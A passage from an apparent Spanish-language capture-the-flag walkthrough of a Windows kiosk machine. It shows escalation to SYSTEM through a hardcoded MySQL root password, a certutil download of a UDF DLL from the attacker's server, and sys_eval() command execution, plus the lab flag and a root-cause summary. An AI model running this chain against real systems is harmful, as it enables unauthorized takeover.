![`dir "C:\ProgramData\HTB Airways" /s /b` lista cuatro archivos: `db-config.ini`, `db-sync-replica.ps1`, `refresh-dates.bat` y `refresh-dates.sql`](images/img-062.png)

y se complementa con una búsqueda dirigida de credenciales dentro de los archivos de configuración de MySQL:

```
findstr /si password C:\MySQL\*.ini C:\MySQL\*.cnf
findstr /si password "C:\Program Files\MySQL\*.ini" "C:\Program Files\MySQL\*.cnf" 2>nul
```

También se revisan los scripts propios de la aplicación que podrían hacer referencia a la base de datos:

```
type "C:\ProgramData\HTB Airways\db-sync-replica.ps1"
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
```

![`type db-sync-replica.ps1` devuelve "Access is denied" como `KioskUser`; `type refresh-dates.bat` sí se lee y muestra la llamada `C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "...\refresh-dates.sql" 2>nul`](images/img-063.png)

El script `db-sync-replica.ps1` no puede leerse con los permisos de `KioskUser`, ya que el sistema devuelve `Access is denied`. Sin embargo, sí es posible consultar `refresh-dates.bat`, que contiene una llamada al cliente de MySQL con el usuario `root` y la contraseña escrita directamente en la línea de comandos:

```cmd
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "...\refresh-dates.sql" 2>nul
```

La contraseña se obtiene, por tanto, **del propio script** `**refresh-dates.bat**`, no de un ataque de fuerza bruta ni de la salida de `findstr`. El script la utiliza para ejecutar una tarea de mantenimiento de la base de datos, pero la deja almacenada en texto claro, lo que permite recuperarla con los permisos de lectura de `KioskUser`.

Las credenciales identificadas son:
- **Usuario:** `root`
- **Contraseña:** `HTB@irw4ys_DB!2026`
- **Base de datos:** `htb_airways`

Con estas credenciales se puede acceder a MySQL y comprobar si la cuenta dispone de privilegios que permitan ejecutar acciones fuera de la base de datos.

### 7.1 Privilegios del usuario root de MySQL

Al consultar los privilegios de las cuentas de MySQL, se observa que `root` tiene habilitados tanto `Grant_priv` como `File_priv`:

```sql
SELECT user,host,Grant_priv,File_priv FROM mysql.user;
```

![`SELECT user,host,Grant_priv,File_priv FROM mysql.user`: de las siete cuentas listadas (`kiosk_app`, `mysql.infoschema`, `mysql.session`, `mysql.sys`, `nexion_app`, `repl_kiosk_b7`, `root`), solo `root` tiene `Grant_priv` y `File_priv` en `Y`](images/img-064.png)

```
File_priv: Y
```

El permiso `FILE` permite a MySQL leer o escribir determinados archivos del sistema. Sin embargo, este permiso por sí solo no permite ejecutar comandos de Windows.

Para conseguirlo, se aprovecha otra característica de MySQL llamada UDF. Una UDF permite añadir funciones nuevas a MySQL mediante una biblioteca externa, en este caso un archivo DLL. La biblioteca utilizada, `lib_mysqludf_sys_64.dll`, incluye la función `sys_eval()`, que permite ejecutar comandos del sistema operativo desde una consulta SQL.

Para utilizarla en esta máquina, se necesitan dos cosas: poder colocar la DLL en el directorio de plugins de MySQL y tener permisos suficientes en MySQL para registrar la función.
### 7.2 Permisos de escritura en el directorio de plugins

La segunda condición necesaria es que el directorio de plugins de MySQL sea escribible. Para comprobar si se puede copiar la DLL al directorio de plugins, se consultan sus permisos:

```cmd
icacls "C:\MySQL\lib\plugin"
```

![`icacls "C:\MySQL\lib\plugin"`: junto a `BUILTIN\Administrators` y `NT AUTHORITY\SYSTEM` con control total, aparece dos veces `NT AUTHORITY\Authenticated Users` con `(M)` — modificación](images/img-065.png)

Al comprobar los permisos NTFS de `C:\MySQL\lib\plugin`, se confirma que el grupo `Authenticated Users` (cualquier usuario autenticado en el sistema, incluido `KioskUser`) tiene permiso de modificación (`M`) sobre esa carpeta.
  
Esta es una configuración incorrecta: ese directorio debería ser escribible únicamente por el propio servicio de MySQL o por un administrador, no por cualquier usuario autenticado.

El resultado revela un problema de permisos: `KioskUser` puede modificar una carpeta utilizada por MySQL para cargar sus bibliotecas. Esto significa que puede colocar allí una DLL sin necesitar una cuenta de administrador de Windows.

La escalada se basa en combinar ese permiso de escritura con las credenciales de `root` de MySQL que se encontraron en `refresh-dates.bat`. Después de copiar la DLL al directorio, se registra la función `sys_eval()` desde MySQL y se utiliza para ejecutar comandos de Windows con los permisos de la cuenta que ejecuta el servicio.

### 7.3 Carga de la DLL UDF y ejecución de comandos como SYSTEM

Una vez comprobado que `KioskUser` puede escribir en el directorio de plugins de MySQL (`FILE_priv Y`), se prepara la biblioteca udf (`lib_mysqludf_sys_64.dll`). Esta DLL incorpora la función `sys_eval()`, que permite ejecutar comandos del sistema operativo desde MySQL.

Primero se comprueba qué bibliotecas hay en el directorio de plugins para verificar que la DLL que se va a utilizar todavía no está presente.

![`dir /b *.dll` en `C:\MySQL\lib\plugin`: listado completo de las DLL ya presentes (`authentication_*`, `component_*`, `mysql_clone.dll`, `rewrite.dll`, `semisync_*`, `validate_password.dll`, etc.), ninguna de ellas la UDF que se va a introducir](images/img-067.png)

La DLL `lib_mysqludf_sys_64.dll` se sirve desde la máquina atacante mediante un servidor HTTP temporal (`python -m http.server 8000`). Desde la máquina objetivo, se utiliza `certutil` para descargar la DLL y guardarla en `C:\MySQL\lib\plugin`.

![Preparación en la máquina atacante: `dir` confirma los 7.168 bytes de `lib_mysqludf_sys_64.dll` en `C:\`, y `python -m http.server 8000` registra la petición `GET /lib_mysqludf_sys_64.dll` entrante desde `10.129.162.178`](images/img-068.png)

![`certutil -urlcache -split -f http://10.10.15.108:8000/lib_mysqludf_sys_64.dll lib_mysqludf_sys_64.dll` completa la descarga; `dir` confirma los mismos 7.168 bytes ya en `C:\MySQL\lib\plugin`](images/img-069.png)

A continuación, se registra la función personalizada:

```sql
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';
```

El primer intento falla porque no se ha seleccionado explícitamente la base de datos `htb_airways` antes de ejecutar el comando. Al repetirlo, la terminal muestra un listado largo de variables y opciones de configuración del propio cliente `mysql.exe` en lugar de un mensaje de error: esto ocurre porque, en ese intento, el comando dejó abierta una sesión interactiva del cliente (el prompt `mysql>`) en vez de ejecutarse como una única línea con el parámetro `-e`, y lo que aparece en pantalla es la ayuda de variables del propio cliente, no el resultado del `CREATE FUNCTION`. Se identifica el problema al reconocer el prompt `mysql>`, se sale de la sesión interactiva con `exit` y se repite el comando correctamente como una sola línea desde `C:\MySQL\lib\plugin>`, ahora sí seleccionando la base de datos `htb_airways`. La función se registra correctamente y se ejecuta:

```sql
SELECT sys_eval('whoami');
```

![`mysql.exe -u root -p"HTB@irw4ys_DB!2026" htb_airways -e "SELECT sys_eval('whoami');"`: el resultado llega como `0x6E7420617574686F726974795C73797374656D`](images/img-070.png)

### 7.4 Decodificación del resultado

MySQL devuelve algunos resultados en hexadecimal cuando el tipo de dato no está definido explícitamente. Para no decodificarlo a mano, se recurre a un one-liner de PowerShell que recorre la cadena en parejas de dígitos y convierte cada una a su carácter ASCII:

```powershell
powershell -Command "$h='6E7420617574686F726974795C73797374656D'; $b=New-Object System.Collections.Generic.List[byte]; for($i=0;$i -lt $h.Length;$i+=2){$b.Add([Convert]::ToByte($h.Substring($i,2),16))}; [Text.Encoding]::ASCII.GetString($b.ToArray())"
```

![Salida del one-liner de PowerShell anterior: `nt authority\system`](images/img-071.png)

El resultado confirma que el servicio de MySQL, y por tanto cualquier comando ejecutado mediante `sys_eval()`, se ejecuta con la cuenta SYSTEM, el nivel de privilegio más alto de Windows, por encima incluso del Administrador.

### 7.5 Localización y lectura de la flag root

Con ejecución de comandos como SYSTEM, se localiza el escritorio de la cuenta Administrador:

```
mysql.exe -u root -p"HTB@irw4ys_DB!2026" htb_airways -e "SELECT CONVERT(sys_eval('dir C:\\Users\\Administrator\\Desktop') USING utf8mb4);"
```

Envolver la llamada en `CONVERT(... USING utf8mb4)` hace que MySQL devuelva el resultado directamente como texto legible, evitando decodificar el hexadecimal manualmente en cada consulta. Al localizar `root.txt` en el listado, se lee con el mismo procedimiento:

```
mysql.exe -u root -p"HTB@irw4ys_DB!2026" htb_airways -e "SELECT CONVERT(sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt') USING utf8mb4);"
```

![Listado de `C:\users\administrator\desktop` vía `sys_eval` + `CONVERT(...USING utf8mb4)`: aparece `root.txt`, 34 bytes, fechado 08/10/2026](images/img-072.png)

![Lectura de `root.txt` con el mismo procedimiento: `5bc7ce3cc8f213f08e47ffb1e2c63507`](images/img-073.png)

**Flag root:**

```
5bc7ce3cc8f213f08e47ffb1e2c63507
```

**Credenciales de MySQL utilizadas en la escalada:**

```
Usuario:        root
Password:       HTB@irw4ys_DB!2026
Base de datos:  htb_airways
```

---
## 8. Resumen de la cadena de explotación

1. El escaneo con Nmap identifica RPC (135), RDP (3389), WinRM (5985) y un panel web propio (8443).
   
2. La enumeración web, apoyada en Burp Suite, descubre que el CSS de `/login` revela un panel de administración completo. Un endpoint sin autenticar filtra el serial del dispositivo, que resulta ser la contraseña por defecto indicada en el propio login.
   
3. El acceso al panel con el serial permite, a través de `/settings` y `/scanner`, obtener los endpoints de la API y unas credenciales de servicio (`KioskUser / K!0sk2026#`).
   
4. Las pruebas en Burp Repeater, eliminando la cookie de sesión endpoint por endpoint, revelan un fallo de control de acceso: `POST /api/scan` y `GET /api/scan/last-capture` son accesibles sin ninguna autenticación.
   
5. Las credenciales filtradas no funcionan contra WinRM, pero sí permiten acceso por RDP, aunque restringido a una aplicación de kiosco.
   
6. Apagar el escáner desde el panel DeviceHub provoca un error en la aplicación de kiosco que termina abriendo una consola de comandos (`cmd.exe`).
   
7. La enumeración local descubre credenciales de MySQL; el usuario `root` tiene `FILE_priv` y el directorio de plugins es escribible por cualquier usuario autenticado, lo que permite cargar una DLL UDF y ejecutar comandos como `NT AUTHORITY\SYSTEM`, con los que se lee la flag root.

**Flag root:** `5bc7ce3cc8f213f08e47ffb1e2c63507`

---
## 9. Lecciones y causas raíz

- **Exposición de información sensible sin autenticación.** El serial del dispositivo, que además hacía de contraseña, podía leerse desde un endpoint abierto. Usar un dato casi público como único secreto constituye, por sí mismo, un diseño frágil.

- **Secretos incrustados en el código del cliente.** Credenciales y rutas de la API acabaron en el HTML y el JavaScript que descarga el navegador, visibles para cualquiera que revise el código fuente de la página.

- **Control de acceso inconsistente en la API.** Algunos endpoints comprobaban la sesión y otros, funcionalmente equivalentes, no lo hacían: el error clásico de proteger una ruta y olvidar su homóloga.

- **Kioscos insuficientemente confinados.** Un error de hardware no controlado abrió una ventana al sistema operativo completo detrás de una aplicación pensada para estar bloqueada por completo. Cualquier diálogo del sistema (abrir archivo, un enlace de ayuda) representa una fuga potencial en este tipo de entornos.

- **Permisos NTFS demasiado permisivos.** Conceder a "Authenticated Users" permiso de escritura sobre una carpeta sensible del motor de base de datos convierte cualquier cuenta de bajo privilegio en un camino directo hacia la escalada a SYSTEM.

---
## 10. Conclusiones

Durante la máquina fui siguiendo las pistas que encontraba en la aplicación, en vez de probar contraseñas al azar. El mensaje que aparecía en el login me ayudó a empezar a buscar credenciales. Cada vez que conseguía acceder a una nueva parte de la aplicación, revisaba el código y el JavaScript para ver qué podía hacer y qué fallos podía probar. También utilicé Burp Repeater para probar los distintos endpoints y comprobar cuáles necesitaban iniciar sesión y cuáles funcionaban sin hacerlo.

No todas las pruebas salieron bien. Las credenciales del escáner no me sirvieron para entrar por WinRM, aunque el puerto estaba abierto. Con RDP tampoco conseguí salir del kiosco usando otra cuenta, atajos de teclado o el parámetro `/admin` de `mstsc`. También probé las rutas `/api/badge`, `/api/scanner/badge` y `/api/scan/badge`, pero no conseguí acceder. Solo existía `/api/badge` y necesitaba autenticación. Durante la escalada con MySQL, el primer intento de registrar la función UDF tampoco funcionó. Conseguí solucionarlo seleccionando la base de datos `htb_airways` y ejecutando la consulta en un solo comando.

Apagar el escáner me permitió probar otro camino. En lugar de seguir intentando subir archivos, comprobé qué pasaba cuando el kiosco intentaba usar un escáner apagado. El error que apareció me permitió abrir el navegador fuera de la aplicación y, desde ahí, conseguí llegar a una consola. Para conseguir privilegios de administrador, revisé los archivos de configuración y los scripts de mantenimiento en vez de intentar adivinar la contraseña de MySQL. Así encontré la contraseña del usuario `root` escrita en el archivo `refresh-dates.bat`.

---
## 11. Registro de pruebas: lo que ha funcionado y lo que no

En esta sección resumo las pruebas que hice durante la máquina. Indico cuáles me ayudaron a avanzar, cuáles no funcionaron y cuáles no pude confirmar. Así puedo repasar la investigación sin repetir todos los pasos que ya he explicado antes.

### Pruebas que sí funcionaron

| Prueba | Resultado | Qué nos permitió concluir |
|---|---|---|
| Escaneo de puertos con Nmap (`-sC -sV` y después `-p-`) | **Funcionó** | Se identificaron los puertos 135, 3389, 5985 y 8443; no aparecieron otros puertos TCP abiertos en el escaneo completo. |
| Acceso al servicio web por HTTP en el puerto 8443 | **Funcionó** | Se llegó a la página de login de Nexion DeviceHub. El servicio habla HTTP plano en las pruebas realizadas, aunque el puerto se asocie habitualmente con HTTPS. |
| Revisión de las respuestas de `/login` con Burp | **Funcionó como reconocimiento** | La contraseña `admin` no permitió entrar, pero el HTML reveló la pista de que la contraseña por defecto era el número de serie del dispositivo. |
| Petición a `GET /api/status` sin cookie | **Funcionó** | La respuesta expuso el modelo, el número de serie y la versión de firmware. El serial encontrado fue `NX-DH-2024-B7042`. |
| Inicio de sesión usando el serial como contraseña | **Funcionó** | Se obtuvo acceso al panel DeviceHub y a sus páginas internas. |
| Revisión de `/settings` y `/scanner` tras iniciar sesión | **Funcionó** | Se descubrieron rutas de la API y las credenciales `KioskUser / K!0sk2026#` incluidas en el contenido entregado al navegador. |
| Repetición de peticiones API sin cookie de sesión | **Funcionó para identificar el fallo** | `POST /api/scan` y `GET /api/scan/last-capture` respondieron sin autenticación; otras rutas comprobadas sí exigían sesión. |
| Conexión RDP con las credenciales filtradas | **Funcionó, con limitaciones** | Se inició una sesión, pero Windows abrió directamente la aplicación de kiosco en vez de un escritorio normal. |
| Uso de la reserva de Layover en el kiosco | **Funcionó** | El apellido `Crawford` y la referencia `KS7X2M` permitieron avanzar hasta la comprobación del documento. |
| Apagar el escáner desde DeviceHub | **Funcionó** | La aplicación del kiosco encontró un error al intentar escanear el documento. Ese error abrió una vía para salir del modo kiosco. |
| Abrir el selector de archivos y ejecutar `cmd.exe` | **Funcionó** | Se consiguió una consola de comandos bajo el usuario de bajo privilegio `KioskUser`. |
| Encontrar las credenciales de MySQL y conectarse como `root` | **Funcionó** | Se pudo consultar la base de datos `htb_airways` y comprobar los privilegios del usuario de MySQL. |
| Comprobar `FILE_priv` y los permisos de `C:\MySQL\lib\plugin` | **Funcionó** | Se confirmó que MySQL tenía el privilegio `FILE` y que `Authenticated Users` podía modificar el directorio de plugins. |
| Descargar y registrar `lib_mysqludf_sys_64.dll` | **Funcionó tras corregir el primer intento** | La DLL quedó disponible para MySQL y se pudo registrar la función `sys_eval`. |
| Ejecutar `SELECT sys_eval('whoami');` | **Funcionó** | El resultado decodificado fue `nt authority\system`, confirmando ejecución de comandos como SYSTEM. |
| Leer `root.txt` mediante `sys_eval` | **Funcionó** | Se obtuvo la flag de root y se completó la cadena de explotación. |

### Pruebas que no han funcionado o no dieron el resultado buscado

| Prueba | Resultado | Por qué no se siguió por esa vía |
|---|---|---|
| Login con la contraseña `admin` | **Falló** | La aplicación devolvió una respuesta de contraseña inválida. Sirvió para observar la respuesta, pero no dio acceso. |
| Autenticación mediante `POST /login/badge` | **Falló** | El servidor respondió `No badge detected`; no había una tarjeta física disponible para usar ese método. |
| Comprobar rutas comunes con `http-enum` | **Sin hallazgos útiles** | No se encontraron rutas adicionales con esa prueba. Esto no demuestra que no existan rutas ocultas; solo que ese escaneo no las encontró. |
| Conectar al puerto 8443 como si fuera HTTPS | **Falló** | Los intentos de negociación TLS no funcionaron. Las pruebas posteriores indicaron que el servicio respondía por HTTP plano. |
| Consultar rutas protegidas como `/dashboard`, `/devices` o `/logs` sin sesión | **No dio acceso** | Las respuestas redirigieron a `/login`. La redirección no demuestra que la ruta no exista, sino que no se pudo consultar directamente sin autenticarse. |
| Consultar `GET /api` sin sesión | **No dio acceso** | Respondió `403 Forbidden` con `Authentication required`. Es distinto de una redirección, pero no bastó por sí solo para descubrir datos. |
| Acceder al kiosco en el puerto 5173 desde la máquina atacante | **No funcionó** | El enlace apuntaba a `localhost:5173`, lo que indica que el servicio estaba pensado para accederse desde la propia máquina objetivo; la conexión externa no respondió. |
| Autenticarse por WinRM con `KioskUser` | **Falló en los mecanismos probados** | El puerto 5985 era accesible, pero `Negotiate` no completó la autenticación y el servidor no tenía habilitado `Basic`. Abrir el puerto y ajustar `TrustedHosts` no resolvió el acceso. |
| Cambiar de usuario desde el cliente RDP | **No funcionó** | Probar parámetros de `mstsc`, solicitar el cuadro de credenciales, usar `Ctrl+Alt+End`, revisar `cmdkey /list` y probar `/admin` no permitió salir de la sesión de kiosco ni abrir una sesión distinta. |
| Rutas candidatas `/api/scanner/badge` y `/api/scan/badge` | **No se encontraron** | No correspondían a endpoints reales. `/api/badge` sí existía, pero redirigía a `/login` sin sesión. |
| Primer intento de registrar la UDF de MySQL | **Falló** | No se seleccionó correctamente la base de datos y después se acabó en el prompt interactivo del cliente, que mostró su ayuda en vez de ejecutar la instrucción como se esperaba. Al ejecutar el comando de una sola línea seleccionando `htb_airways`, funcionó. |

### Pruebas pendientes o que no deben darse por demostradas

- **`/api/badge` con una cookie válida:** se comprobó sin sesión y redirigió a `/login`, pero la prueba autenticada quedó pendiente. Por tanto, no se puede afirmar qué devuelve después de iniciar sesión.

- **Subida de un archivo mediante `/api/scanner/test-image`:** el código observado sugería que el endpoint aceptaba un archivo, pero la cadena final no necesitó demostrar una subida maliciosa. La vía que sí funcionó fue apagar el escáner y aprovechar el error del kiosco.

- **Enumeración de rutas:** las rutas no encontradas en estas pruebas no deben describirse como inexistentes en términos absolutos; solo se puede afirmar el resultado concreto de las peticiones realizadas.

- **La diferencia de IP entre capturas:** si una captura muestra una IP distinta de `10.129.160.249`, puede deberse a que la máquina se reinició y recibió otra dirección. Hay que comprobarlo con el contexto de la sesión antes de tratarla como un error del procedimiento.